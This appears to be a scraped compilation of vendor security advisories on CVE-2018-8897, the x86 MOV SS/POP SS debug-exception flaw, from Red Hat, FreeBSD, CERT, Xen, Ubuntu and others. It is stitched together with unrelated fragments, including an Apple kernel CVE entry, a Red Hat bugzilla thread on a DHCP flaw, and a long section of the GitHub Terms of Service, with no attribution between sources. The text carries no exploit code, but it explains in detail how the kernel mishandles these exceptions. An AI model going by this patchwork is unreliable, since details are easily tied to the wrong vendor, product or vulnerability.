An update for kernel is now available for Red Hat Enterprise Linux 6.4 Advanced Update Support.

Red Hat Product Security has rated this update as having a security impact of Moderate. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

[Updated 10 May 2018]

The references to CVE-2017-5754 x86 (32-bit) mitigation were removed because Red Hat Enterprise Linux 6.4 Advanced Update Support does not include support for x86 32-bit architecture. Consequently, impact rating of this erratum was changed from Important to Moderate.

## Description

The kernel packages contain the Linux kernel, the core of any Linux operating system.

Security Fix(es):

* Kernel: error in exception handling leads to DoS (CVE-2018-8897)

For more details about the security issue(s), including the impact, a CVSS score, and other related information, refer to the CVE page(s) listed in the References section.

Red Hat would like to thank Nick Peterson (Everdox Tech LLC) and Andy Lutomirski for reporting this issue.

Bug Fix(es):

* The kernel build requirements have been updated to the GNU Compiler Collection (GCC) compiler version that has the support for Retpolines. The Retpolines mechanism is a software construct that leverages specific knowledge of the underlying hardware to mitigate the branch target injection, also known as Spectre variant 2 vulnerability described in CVE-2017-5715. (BZ#1554251)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

The system must be rebooted for this update to take effect.

## Affected Products

* Red Hat Enterprise Linux Server - AUS 6.4 x86\_64

## Fixes

* [BZ - 1567074](https://bugzilla.redhat.com/show_bug.cgi?id=1567074)
  - CVE-2018-8897 Kernel: error in exception handling leads to DoS

**Advisory ID:** NTAP-20180927-0002
**Version:**
4.0

**Last updated:**
06/14/2022

**Status:**
Final.

**CVEs:** CVE-2018-8897

Overview
#### Summary

Multiple NetApp products use x86 architecture. On x86 systems the MOV SS and POP SS instructions inhibit some debug exceptions until the next instruction has completed. This can allow the kernel context to handle debug exceptions instead of the user context. Successful exploitation of this vulnerability by a local authenticated attacker could result in disclosure of sensitive information, escalation of privilege, or cause Denial of Service (DoS).

#### Impact

Successful exploitation of this vulnerability by a local authenticated attacker could result in disclosure of sensitive information, escalation of privilege, or cause Denial of Service (DoS).

Description: A memory corruption issue was addressed with improved error handling.

CVE-2018-4206: Ian Beer of Google Project Zero

**Kernel**

Available for: macOS High Sierra 10.13.4

Impact: A malicious application may be able to execute arbitrary code with kernel privileges

Statement:  Red Hat has been made aware of a vulnerability affecting the DHCP client packages as shipped with Red Hat Enterprise Linux 6 and 7. This vulnerability [CVE-2018-1111](https://access.redhat.com/security/cve/CVE-2018-1111) was rated as having a security impact of Critical. A malicious DHCP server, or an attacker on the local network able to spoof DHCP responses, could use this flaw to execute arbitrary commands with root privileges on systems using NetworkManager and configured to obtain network configuration using the DHCP protocol.  Red Hat Enterprise Virtualization 4.1 includes the vulnerable components, but the default configuration is not impacted because NetworkManager is turned off in the Management Appliance, and not used in conjunction with DHCP in the Hypervisor. Customers can still obtain the updated packages from Red Hat Enterprise Linux channels using `yum update`, or upgrade to Red Hat Enterprise Virtualization 4.2, which includes the fixed packages.  Red Hat Enterprise Virtualization 3.6 is not vulnerable as it does not use DHCP.   ```  [Comment 48](show_bug.cgi?id=1567974#c48)  Doran Moppert    2018-05-16 11:20:03 UTC  ``` This issue has been addressed in the following products:    Red Hat Virtualization 4 Management Appliance  Via RHSA-2018:1525 [https://access.redhat.com/errata/RHSA-2018:1525](https://access.redhat.com/errata/RHSA-2018%3A1525)   ```  [Comment 49](show_bug.cgi?id=1567974#c49)  Tomas Hoger    2018-05-17 08:04:13 UTC  ``` ISC, upstream for the ISC DHCP client and server implementation that is used in Red Hat Enterprise Linux, issued a statement confirming that this issue does not affect upstream packages, as the flaw is in the additional NetworkManager integration script that was written for use in Fedora and Red Hat Enterprise Linux:  <https://lists.isc.org/pipermail/dhcp-users/2018-May/021250.html>   ``` |  |

## Details

Nick Peterson discovered that the Linux kernel did not

properly handle debug exceptions following a MOV/POP to SS

instruction. A local attacker could use this to cause a denial

of service (system crash). This issue only affected the amd64

architecture. ([CVE-2018-8897](/security/CVE-2018-8897))

Andy Lutomirski discovered that the KVM subsystem of the Linux kernel

did not properly emulate the ICEBP instruction following a MOV/POP

to SS instruction. A local attacker in a KVM virtual machine could

use this to cause a denial of service (guest VM crash) or possibly

escalate privileges inside of the virtual machine. This issue only

affected the i386 and amd64 architectures. ([CVE-2018-1087](/security/CVE-2018-1087))

Andy Lutomirski discovered that the Linux kernel did not properly

perform error handling on virtualized debug registers. A local

attacker could use this to cause a denial of service (system crash)

or possibly execute arbitrary code. ([CVE-2018-1000199](/security/CVE-2018-1000199))

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

x86/entry/64: Don't use IST entry for #BP stackThere's nothing IST-worthy about #BP/int3. We don't allow kprobes
in the small handful of places in the kernel that run at CPL0 with
an invalid stack, and 32-bit kernels have used normal interrupt
gates for #BP forever.
Furthermore, we don't allow kprobes in places that have usergs while
in kernel mode, so "paranoid" is also unnecessary.

=============================================================================
FreeBSD-SA-18:06.debugreg Security Advisory
The FreeBSD Project
Topic: Mishandling of x86 debug exceptions
Category: core
Module: kernel
Announced: 2018-05-08
Credits: Nick Peterson, Everdox Tech LLC
https://www.linkedin.com/in/everdox
Andy Lutomirski
Affects: All supported versions of FreeBSD.
Corrected: 2018-05-08 17:03:33 UTC (stable/11, 11.2-PRERELEASE)
2018-05-08 17:12:10 UTC (releng/11.1, 11.1-RELEASE-p10)
2018-05-08 17:05:39 UTC (stable/10, 10.4-STABLE)
2018-05-08 17:12:10 UTC (releng/10.4, 10.4-RELEASE-p9)
CVE Name: CVE-2018-8897
For general information regarding FreeBSD Security Advisories,
including descriptions of the fields above, security branches, and the
following sections, please visit .
I. Background
On x86 architecture systems, the stack is represented by the combination of
a stack segment and a stack pointer, which must remain in sync for proper
operation. Instructions related to manipulating the stack segment have
special handling to facilitate consistency with changes to the stack pointer.
II. Problem Description
The MOV SS and POP SS instructions inhibit debug exceptions until the
instruction boundary following the next instruction. If that instruction is
a system call or similar instruction that transfers control to the operating
system, the debug exception will be handled in the kernel context instead of
the user context.
III. Impact
An authenticated local attacker may be able to read sensitive data in kernel
memory, control low-level operating system functions, or may panic the
system.
IV. Workaround
No workaround is available.
V. Solution
Upgrade your vulnerable system to a supported FreeBSD stable or
release / security branch (releng) dated after the correction date,
using either a binary or source code patch, and then reboot.
1) To update your vulnerable system via a binary patch:
Systems running a RELEASE version of FreeBSD on the i386 or amd64
platforms can be updated via the freebsd-update(8) utility:
# freebsd-update fetch
# freebsd-update install
And reboot.
2) To update your vulnerable system via a source code patch:
The following patches have been verified to apply to the applicable
FreeBSD release branches.
a) Download the relevant patch from the location below, and verify the
detached PGP signature using your PGP utility.
[FreeBSD 11.1]
# fetch https://security.FreeBSD.org/patches/SA-18:06/debugreg.11.1.patch
# fetch https://security.FreeBSD.org/patches/SA-18:06/debugreg.11.1.patch.asc
# gpg --verify debugreg.11.1.patch.asc
[FreeBSD 10.4]
# fetch https://security.FreeBSD.org/patches/SA-18:06/debugreg.10.4.patch
# fetch https://security.FreeBSD.org/patches/SA-18:06/debugreg.10.4.patch.asc
# gpg --verify debugreg.10.4.patch.asc
b) Apply the patch. Execute the following commands as root:
# cd /usr/src
# patch < /path/to/patch
c) Recompile and install your kernel as described in
 and reboot the
system.
VI. Correction details
The following list contains the correction revision numbers for each
affected branch.
Branch/path Revision
- -------------------------------------------------------------------------
stable/10/ r333370

## Hardware debug exception documentation may result in unexpected behavior

#### Vulnerability Note VU#631579

Original Release Date: 2018-05-08 | Last Revised: 2019-07-11

---

### Overview

In some circumstances, some operating systems or hypervisors may not expect or properly handle an Intel architecture hardware debug exception. The error appears to be due to developer interpretation of existing documentation for certain Intel architecture interrupt/exception instructions, namely MOV SS and POP SS.

### Description

| [**CWE-703**](http://cwe.mitre.org/data/definitions/703.html)**: Improper Check or Handling of Exceptional Conditions -** CVE-2018-8897  The MOV SS and POP SS instructions inhibit interrupts (including NMIs), data breakpoints, and single step trap exceptions until the instruction boundary following the next instruction (SDM Vol. 3A; section 6.8.3). (The inhibited data breakpoints are those on memory accessed by the MOV SS or POP SS instruction itself). Note that debug exceptions are not inhibited by the interrupt enable (EFLAGS.IF) system flag (SDM Vol 3A; section 2.3).If the instruction following the MOV SS or POP SS instruction is an instruction like SYSCALL, SYSENTER, INT 3, etc. that transfers control to the operating system at Current Privilege Level (CPL) < 3, a debug exception is delivered after the transfer to CPL < 3 is complete. Such deferred #DB exceptions by MOV SS and POP SS may result in unexpected behavior.Therefore, in certain circumstances after the use of certain Intel x86-64 architecture instructions, a debug exception pointing to data in a lower ring (for most operating systems, the kernel Ring 0 level) is made available to operating system components running in Ring 3. This may allow an attacker to utilize operating system APIs to gain access to sensitive memory information or control low-level operating system functions.Several operating systems appear to incorrectly handle this exception due to interpretation of potentially unclear existing documentation and guidance on the use of these instructions.More details can be found in the [researcher's paper](https://everdox.net/popss.pdf). |

### Impact

| An authenticated attacker may be able to read sensitive data in memory or control low-level operating system functions, |

### Vendor Statement

All versions of Xen are vulnerable. Only x86 systems are vulnerable.  ARM systems are not vulnerable.

Only x86 PV guests can exploit the vulnerability.  x86 HVM and PVH guests cannot exploit the vulnerability.

An attacker needs to be able to control hardware debugging facilities to exploit the vulnerability, but such permissions are typically available to unprivileged users.

MITIGATION
==========

Running only HVM or PVH guests avoids the vulnerability.

Note however that a compromised device model (running in dom0 or a stub domain) can carry out this attack, so users with HVM domains are also advised to patch their systems.

RESOLUTION
==========
Applying the appropriate attached patch resolves this issue.

**Detail**

* CVE-2018-8897

  + Severity: Moderate
  + CVSS3 Base Score: 6.5
  + CVSS3 Vector: [CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H)
  + A statement in the System Programming Guide of the Intel 64 and IA-32 Architectures Software Developer's Manual (SDM) was mishandled in the development of some or all operating-system kernels, resulting in unexpected behavior for #DB exceptions that are deferred by MOV SS or POP SS, as demonstrated by (for example) privilege escalation in Windows, macOS, some Xen configurations, or FreeBSD, or a Linux kernel crash. The MOV to SS and POP SS instructions inhibit interrupts (including NMIs), data breakpoints, and single step trap exceptions until the instruction boundary following the next instruction (SDM Vol. 3A; section 6.8.3). (The inhibited data breakpoints are those on memory accessed by the MOV to SS or POP to SS instruction itself.) Note that debug exceptions are not inhibited by the interrupt enable (EFLAGS.IF) system flag (SDM Vol. 3A; section 2.3). If the instruction following the MOV to SS or POP to SS instruction is an instruction like SYSCALL, SYSENTER, INT 3, etc. that transfers control to the operating system at CPL < 3, the debug exception is delivered after the transfer to CPL < 3 is complete. OS kernels may not expect this order of events and may therefore experience unexpected behavior when it occurs.
* CVE-2018-1087

  + Severity: Important
  + CVSS3 Base Score: 7.8
  + CVSS3 Vector: [CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
  + kernel KVM before versions kernel 4.16, kernel 4.16-rc7, kernel 4.17-rc1, kernel 4.17-rc2 and kernel 4.17-rc3 is vulnerable to a flaw in the way the Linux kernel's KVM hypervisor handled exceptions delivered after a stack switch operation via Mov SS or Pop SS instructions. During the stack switch operation, the processor did not deliver interrupts and exceptions, rather they are delivered once the first instruction after the stack switch is executed. An unprivileged KVM guest user could use this flaw to crash the guest or, potentially, escalate their privileges in the guest.

Subject: CVE-2018-8897: #DB exceptions that are deferred by MOV SS or POP SS
 may cause unexpected behavior

On x86 CPUs, the MOV to SS and POP SS instructions inhibit interrupts
(including NMIs), data breakpoints, and single step trap exceptions until
the instruction boundary following the next instruction (SDM Vol. 3A;
section 6.8.3). (The inhibited data breakpoints are those on memory
accessed by the MOV to SS or POP to SS instruction itself.) Note that debug
exceptions are not inhibited by the interrupt enable (EFLAGS.IF) system
flag (SDM Vol 3A; section 2.3). If the instruction following the MOV to SS
or POP to SS instruction is an instruction like SYSCALL, SYSENTER, INT 3,
etc. that transfers control to the operating system at CPL < 3, the debug
exception is delivered after the transfer to CPL < 3 is complete.  OS
kernels may not expect this order of events and may therefore experience
unexpected behavior when it occurs.

It appears that few or no 64-bit operating system kernels handler this
correctly. On operating systems that allow users to install data
breakpoints, the only correct way that a kernel can handle this CPU
behavior is to use the IST mechanism for the #DB vector or to disable
SYSCALL. Needless to say, the latter is unpopular.

Linux has always used IST for #DB, but it used the same IST slot for #BP,
so it was vulnerable to a DoS.  Many other operating systems did not use
IST for #DB and are likely vulnerable to privilege escalation.  Some
operating systems did not allow user control over hardware debugging, and
they are believed to be immune. Similarly, operating systems that run
hardware virtualized guests only are likely immune, since VM exits are
handled differently.  (However, see CVE-2018-1087 for a related issue
affecting KVM.)

On Linux, the issue is fixed by commit d8ba61ba58c8 ("x86/entry/64: Don't
use IST entry for #BP stack"), which has been available in Linus' tree and
-stable kernels for some time.  (Yes, the patch really was written in
2015.  I fixed the issue as part of related work by accident, but I wasn't
aware that the issue was at all urgent at the time, so the patch was never
pushed out.)  Most other vendors should have their own advisories and fixes
available now.

This issue was discovered by Nick Peterson of Everdox Tech, LLC.  A number
of industry players coordinated very professionally to handle this issue --
thanks to all involved.

## [The GitHub Terms of Service](#the-github-terms-of-service)

Effective date: November 16, 2020

## [A. Definitions](#a-definitions)

**Short version:** *We use these basic terms throughout the agreement, and they have specific meanings. You should know what we mean when we use each of the terms. There's not going to be a test on it, but it's still useful information.*

1. An "Account" represents your legal relationship with GitHub. A “Personal Account” represents an individual User’s authorization to log in to and use the Service and serves as a User’s identity on GitHub. “Organizations” are shared workspaces that may be associated with a single entity or with one or more Users where multiple Users can collaborate across many projects at once. A Personal Account can be a member of any number of Organizations.
2. The “Agreement” refers, collectively, to all the terms, conditions, notices contained or referenced in this document (the “Terms of Service” or the "Terms") and all other operating rules, policies (including the GitHub Privacy Statement, available at [github.com/site/privacy](https://github.com/site/privacy)) and procedures that we may publish from time to time on the Website. Most of our site policies are available at [docs.github.com/categories/site-policy](/en/site-policy).
3. "Beta Previews" mean software, services, or features identified as alpha, beta, preview, early access, or evaluation, or words or phrases with similar meanings.
4. “Content” refers to content featured or displayed through the Website, including without limitation code, text, data, articles, images, photographs, graphics, software, applications, packages, designs, features, and other materials that are available on the Website or otherwise available through the Service. "Content" also includes Services. “User-Generated Content” is Content, written or otherwise, created or uploaded by our Users. "Your Content" is Content that you create or own.
5. “GitHub,” “We,” and “Us” refer to GitHub, Inc., as well as our affiliates, directors, subsidiaries, contractors, licensors, officers, agents, and employees.
6. The “Service” refers to the applications, software, products, and services provided by GitHub, including any Beta Previews.
7. “The User,” “You,” and “Your” refer to the individual person, company, or organization that has visited or is using the Website or Service; that accesses or uses any part of the Account; or that directs the use of the Account in the performance of its functions. A User must be at least 13 years of age. Special terms may apply for business or government Accounts (See [Section B(5): Additional Terms](#5-additional-terms)).
8. The “Website” refers to GitHub’s website located at [github.com](https://github.com/), and all content, services, and products provided by GitHub at or through the Website. It also refers to GitHub-owned subdomains of github.com, such as [education.github.com](https://education.github.com/) and [pages.github.com](https://pages.github.com/). These Terms also govern GitHub’s conference websites, such as [githubuniverse.com](https://githubuniverse.com/), and product websites, such as [electronjs.org](https://www.electronjs.org/). Occasionally, websites owned by GitHub may provide different or additional terms of service. If those additional terms conflict with this Agreement, the more specific terms apply to the relevant page or service.

## [B. Account Terms](#b-account-terms)

**Short version:** *Personal Accounts and Organizations have different administrative controls; a human must create your Account; you must be 13 or over; you must provide a valid email address; and you may not have more than one free Account. You alone are responsible for your Account and anything that happens while you are signed in to or using your Account. You are responsible for keeping your Account secure.*

### [1. Account Controls](#1-account-controls)

* Users. Subject to these Terms, you retain ultimate administrative control over your Personal Account and the Content within it.
* Organizations. The "owner" of an Organization that was created under these Terms has ultimate administrative control over that Organization and the Content within it. Within the Service, an owner can manage User access to the Organization’s data and projects. An Organization may have multiple owners, but there must be at least one Personal Account designated as an owner of an Organization. If you are the owner of an Organization under these Terms, we consider you responsible for the actions that are performed on or through that Organization.

### [2. Required Information](#2-required-information)

You must provide a valid email address in order to complete the signup process. Any other information requested, such as your real name, is optional, unless you are accepting these terms on behalf of a legal entity (in which case we need more information about the legal entity) or if you opt for a [paid Account](#k-payment), in which case additional information will be necessary for billing purposes.

### [3. Account Requirements](#3-account-requirements)

We have a few simple rules for Personal Accounts on GitHub's Service.

* You must be a human to create an Account. Accounts registered by "bots" or other automated methods are not permitted. We do permit machine accounts:
* A machine account is an Account set up by an individual human who accepts the Terms on behalf of the Account, provides a valid email address, and is responsible for its actions. A machine account is used exclusively for performing automated tasks. Multiple users may direct the actions of a machine account, but the owner of the Account is ultimately responsible for the machine's actions. You may maintain no more than one free machine account in addition to your free Personal Account.
* One person or legal entity may maintain no more than one free Account (if you choose to control a machine account as well, that's fine, but it can only be used for running a machine).
* You must be age 13 or older. While we are thrilled to see brilliant young coders get excited by learning to program, we must comply with United States law. GitHub does not target our Service to children under 13, and we do not permit any Users under 13 on our Service. If we learn of any User under the age of 13, we will [terminate that User’s Account immediately](#l-cancellation-and-termination). If you are a resident of a country outside the United States, your country’s minimum age may be older; in such a case, you are responsible for complying with your country’s laws.
* Your login may only be used by one person — i.e., a single login may not be shared by multiple people. A paid Organization may only provide access to as many Personal Accounts as your subscription allows.
* You may not use GitHub in violation of export control or sanctions laws of the United States or any other applicable jurisdiction. You may not use GitHub if you are or are working on behalf of a [Specially Designated National (SDN)](https://www.treasury.gov/resource-center/sanctions/SDN-List/Pages/default.aspx) or a person subject to similar blocking or denied party prohibitions administered by a U.S. government agency. GitHub may allow persons in certain sanctioned countries or territories to access certain GitHub services pursuant to U.S. government authorizations. For more information, please see our [Export Controls policy](/en/site-policy/other-site-policies/github-and-trade-controls).

### [4. Account Security](#4-account-security)

You are responsible for keeping your Account secure while you use our Service. We offer tools such as two-factor authentication to help you maintain your Account's security, but the content of your Account and its security are up to you.

* You are responsible for all content posted and activity that occurs under your Account (even when content is posted by others who have Accounts under your Account).
* You are responsible for maintaining the security of your Account and password. GitHub cannot and will not be liable for any loss or damage from your failure to comply with this security obligation.
* You will promptly notify GitHub by contacting us through the [GitHub Support portal](https://support.github.com/) if you become aware of any unauthorized use of, or access to, our Service through your Account, including any unauthorized use of your password or Account.

### [5. Additional Terms](#5-additional-terms)

In some situations, third parties' terms may apply to your use of GitHub. For example, you may be a member of an organization on GitHub with its own terms or license agreements; you may download an application that integrates with GitHub; or you may use GitHub to authenticate to another service. Please be aware that while these Terms are our full agreement with you, other parties' terms govern their relationships with you.

If you are a government User or otherwise accessing or using any GitHub Service in a government capacity, this [Government Amendment to GitHub Terms of Service](/en/site-policy/site-policy-deprecated/amendment-to-github-terms-of-service-applicable-to-us-federal-government-users) applies to you, and you agree to its provisions.

If you have signed up for GitHub Enterprise Cloud, the [Enterprise Cloud Addendum](/en/site-policy/site-policy-deprecated/github-enterprise-service-level-agreement) applies to you, and you agree to its provisions.

## [C. Acceptable Use](#c-acceptable-use)

**Short version:** *GitHub hosts a wide variety of collaborative projects from all over the world, and that collaboration only works when our users are able to work together in good faith. While using the service, you must follow the terms of this section, which include some restrictions on content you can post, conduct on the service, and other limitations. In short, be excellent to each other.*

Your use of the Website and Service must not violate any applicable laws, including copyright or trademark laws, export control or sanctions laws, or other laws in your jurisdiction. You are responsible for making sure that your use of the Service is in compliance with laws and any applicable regulations.

You agree that you will not under any circumstances violate our [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) or [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

## [D. User-Generated Content](#d-user-generated-content)

**Short version:** *You own content you create, but you allow us certain rights to it, so that we can display and share the content you post. You still have control over your content, and responsibility for it, and the rights you grant us are limited to those we need to provide the service. We have the right to remove content or close Accounts if we need to.*

### [1. Responsibility for User-Generated Content](#1-responsibility-for-user-generated-content)

You may create or upload User-Generated Content while using the Service. You are solely responsible for the content of, and for any harm resulting from, any User-Generated Content that you post, upload, link to or otherwise make available via the Service, regardless of the form of that Content. We are not responsible for any public display or misuse of your User-Generated Content.

### [2. GitHub May Remove Content](#2-github-may-remove-content)

We have the right to refuse or remove any User-Generated Content that, in our sole discretion, violates any laws or [GitHub terms or policies](/en/site-policy). User-Generated Content displayed on GitHub Mobile may be subject to mobile app stores' additional terms.

### [3. Ownership of Content, Right to Post, and License Grants](#3-ownership-of-content-right-to-post-and-license-grants)

You retain ownership of and responsibility for Your Content. If you're posting anything you did not create yourself or do not own the rights to, you agree that you are responsible for any Content you post; that you will only submit Content that you have the right to post; and that you will fully comply with any third party licenses relating to Content you post.

Because you retain ownership of and responsibility for Your Content, we need you to grant us — and other GitHub Users — certain legal permissions, listed in Sections D.4 — D.7. These license grants apply to Your Content. If you upload Content that already comes with a license granting GitHub the permissions we need to run our Service, no additional license is required. You understand that you will not receive any payment for any of the rights granted in Sections D.4 — D.7. The licenses you grant to us will end when you remove Your Content from our servers, unless other Users have forked it.

### [4. License Grant to Us](#4-license-grant-to-us)

We need the legal right to do things like host Your Content, publish it, and share it. You grant us and our legal successors the right to store, archive, parse, and display Your Content, and make incidental copies, as necessary to provide the Service, including improving the Service over time. This license includes the right to do things like copy it to our database and make backups; show it to you and other users; parse it into a search index or otherwise analyze it on our servers; share it with other users; and perform it, in case Your Content is something like music or video.

This license does not grant GitHub the right to sell Your Content. It also does not grant GitHub the right to otherwise distribute or use Your Content outside of our provision of the Service, except that as part of the right to archive Your Content, GitHub may permit our partners to store and archive Your Content in public repositories in connection with the [GitHub Arctic Code Vault and GitHub Archive Program](https://archiveprogram.github.com/).

### [5. License Grant to Other Users](#5-license-grant-to-other-users)

Any User-Generated Content you post publicly, including issues, comments, and contributions to other Users' repositories, may be viewed by others. By setting your repositories to be viewed publicly, you agree to allow others to view and "fork" your repositories (this means that others may make their own copies of Content from your repositories in repositories they control).

If you set your pages and repositories to be viewed publicly, you grant each User of GitHub a nonexclusive, worldwide license to use, display, and perform Your Content through the GitHub Service and to reproduce Your Content solely on GitHub as permitted through GitHub's functionality (for example, through forking). You may grant further rights if you [adopt a license](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository#including-an-open-source-license-in-your-repository). If you are uploading Content you did not create or own, you are responsible for ensuring that the Content you upload is licensed under terms that grant these permissions to other GitHub Users.

### [6. Contributions Under Repository License](#6-contributions-under-repository-license)

Whenever you add Content to a repository containing notice of a license, you license that Content under the same terms, and you agree that you have the right to license that Content under those terms. If you have a separate agreement to license that Content under different terms, such as a contributor license agreement, that agreement will supersede.

Isn't this just how it works already? Yep. This is widely accepted as the norm in the open-source community; it's commonly referred to by the shorthand "inbound=outbound". We're just making it explicit.

### [7. Moral Rights](#7-moral-rights)

You retain all moral rights to Your Content that you upload, publish, or submit to any part of the Service, including the rights of integrity and attribution. However, you waive these rights and agree not to assert them against us, to enable us to reasonably exercise the rights granted in Section D.4, but not otherwise.

To the extent this agreement is not enforceable by applicable law, you grant GitHub the rights we need to use Your Content without attribution and to make reasonable adaptations of Your Content as necessary to render the Website and provide the Service.

## [E. Private Repositories](#e-private-repositories)

**Short version:** *We treat the content of private repositories as confidential, and we only access it as described in our Privacy Statement—for security purposes, to assist the repository owner with a support matter, to maintain the integrity of the Service, to comply with our legal obligations, if we have reason to believe the contents are in violation of the law, or with your consent.*

### [1. Control of Private Repositories](#1-control-of-private-repositories)

Some Accounts may have private repositories, which allow the User to control access to Content.

### [2. Confidentiality of Private Repositories](#2-confidentiality-of-private-repositories)

GitHub considers the contents of private repositories to be confidential to you. GitHub will protect the contents of private repositories from unauthorized use, access, or disclosure in the same manner that we would use to protect our own confidential information of a similar nature and in no event with less than a reasonable degree of care.

### [3. Access](#3-access)

GitHub personnel may only access the content of your private repositories in the situations described in our [Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement#repository-contents).

You may choose to enable additional access to your private repositories. For example:

* You may enable various GitHub services or features that require additional rights to Your Content in private repositories. These rights may vary depending on the service or feature, but GitHub will continue to treat your private repository Content as confidential. If those services or features require rights in addition to those we need to provide the GitHub Service, we will provide an explanation of those rights.

Additionally, we may be [compelled by law](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure) to disclose the contents of your private repositories.

GitHub will provide notice regarding our access to private repository content, unless [for legal disclosure](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure), to comply with our legal obligations, or where otherwise bound by requirements under law, for automated scanning, or if in response to a security threat or other risk to security.

## [F. Copyright Infringement and DMCA Policy](#f-copyright-infringement-and-dmca-policy)

If you believe that content on our website violates your copyright, please contact us in accordance with our [Digital Millennium Copyright Act Policy](/en/site-policy/content-removal-policies/dmca-takedown-policy). If you are a copyright owner and you believe that content on GitHub violates your rights, please contact us via [our convenient DMCA form](https://github.com/contact/dmca) or by emailing copyright@github.com. There may be legal consequences for sending a false or frivolous takedown notice. Before sending a takedown request, you must consider legal uses such as fair use and licensed uses.

We will terminate the Accounts of [repeat infringers](/en/site-policy/content-removal-policies/dmca-takedown-policy#e-repeated-infringement) of this policy.

## [G. Intellectual Property Notice](#g-intellectual-property-notice)

**Short version:** *We own the service and all of our content. In order for you to use our content, we give you certain rights to it, but you may only use our content in the way we have allowed.*

### [1. GitHub's Rights to Content](#1-githubs-rights-to-content)

GitHub and our licensors, vendors, agents, and/or our content providers retain ownership of all intellectual property rights of any kind related to the Website and Service. We reserve all rights that are not expressly granted to you under this Agreement or by law. The look and feel of the Website and Service is copyright © GitHub, Inc. All rights reserved. You may not duplicate, copy, or reuse any portion of the HTML/CSS, JavaScript, or visual design elements or concepts without express written permission from GitHub.

### [2. GitHub Trademarks and Logos](#2-github-trademarks-and-logos)

If you’d like to use GitHub’s trademarks, you must follow all of our trademark guidelines, including those on our logos page: <https://github.com/logos>.

### [3. License to GitHub Policies](#3-license-to-github-policies)

This Agreement is licensed under this [Creative Commons Zero license](https://creativecommons.org/publicdomain/zero/1.0/). For details, see our [site-policy repository](https://github.com/github/site-policy#license).

## [H. API Terms](#h-api-terms)

**Short version:** *You agree to these Terms of Service, plus this Section H, when using any of GitHub's APIs (Application Provider Interface), including use of the API through a third party product that accesses GitHub.*

Abuse or excessively frequent requests to GitHub via the API may result in the temporary or permanent suspension of your Account's access to the API. GitHub, in our sole discretion, will determine abuse or excessive usage of the API. We will make a reasonable attempt to warn you via email prior to suspension.

You may not share API tokens to exceed GitHub's rate limitations.

You may not use the API to download data or Content from GitHub for spamming purposes, including for the purposes of selling GitHub users' personal information, such as to recruiters, headhunters, and job boards.

All use of the GitHub API is subject to these Terms of Service and the [GitHub Privacy Statement](https://github.com/site/privacy).

GitHub may offer subscription-based access to our API for those Users who require high-throughput access or access that would result in resale of GitHub's Service.

## [I. GitHub Additional Product Terms](#i-github-additional-product-terms)

**Short version:** *You need to follow certain specific terms and conditions for GitHub's various features and products, and you agree to the Supplemental Terms and Conditions when you agree to this Agreement.*

Some Service features may be subject to additional terms specific to that feature or product as set forth in the GitHub Additional Product Terms. By accessing or using the Services, you also agree to the [GitHub Additional Product Terms](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

## [J. Beta Previews](#j-beta-previews)

**Short version:** *Beta Previews may not be supported or may change at any time. You may receive confidential information through those programs that must remain confidential while the program is private. We'd love your feedback to make our Beta Previews better.*

### [1. Subject to Change](#1-subject-to-change)

Beta Previews may not be supported and may be changed at any time without notice. In addition, Beta Previews are not subject to the same security measures and auditing to which the Service has been and is subject. **By using a Beta Preview, you use it at your own risk.**

### [2. Confidentiality](#2-confidentiality)

As a user of Beta Previews, you may get access to special information that isn’t available to the rest of the world. Due to the sensitive nature of this information, it’s important for us to make sure that you keep that information secret.

**Confidentiality Obligations.** You agree that any non-public Beta Preview information we give you, such as information about a private Beta Preview, will be considered GitHub’s confidential information (collectively, “Confidential Information”), regardless of whether it is marked or identified as such. You agree to only use such Confidential Information for the express purpose of testing and evaluating the Beta Preview (the “Purpose”), and not for any other purpose. You should use the same degree of care as you would with your own confidential information, but no less than reasonable precautions to prevent any unauthorized use, disclosure, publication, or dissemination of our Confidential Information. You promise not to disclose, publish, or disseminate any Confidential Information to any third party, unless we don’t otherwise prohibit or restrict such disclosure (for example, you might be part of a GitHub-organized group discussion about a private Beta Preview feature).

**Exceptions.** Confidential Information will not include information that is: (a) or becomes publicly available without breach of this Agreement through no act or inaction on your part (such as when a private Beta Preview becomes a public Beta Preview); (b) known to you before we disclose it to you; (c) independently developed by you without breach of any confidentiality obligation to us or any third party; or (d) disclosed with permission from GitHub. You will not violate the terms of this Agreement if you are required to disclose Confidential Information pursuant to operation of law, provided GitHub has been given reasonable advance written notice to object, unless prohibited by law.

### [3. Feedback](#3-feedback)

We’re always trying to improve of products and services, and your feedback as a Beta Preview user will help us do that. If you choose to give us any ideas, know-how, algorithms, code contributions, suggestions, enhancement requests, recommendations or any other feedback for our products or services (collectively, “Feedback”), you acknowledge and agree that GitHub will have a royalty-free, fully paid-up, worldwide, transferable, sub-licensable, irrevocable and perpetual license to implement, use, modify, commercially exploit and/or incorporate the Feedback into our products, services, and documentation.

## [K. Payment](#k-payment)

**Short version:** *You are responsible for any fees associated with your use of GitHub. We are responsible for communicating those fees to you clearly and accurately, and letting you know well in advance if those prices change.*

### [1. Pricing](#1-pricing)

Our pricing and payment terms are available at [github.com/pricing](https://github.com/pricing). If you agree to a subscription price, that will remain your price for the duration of the payment term; however, prices are subject to change at the end of a payment term.

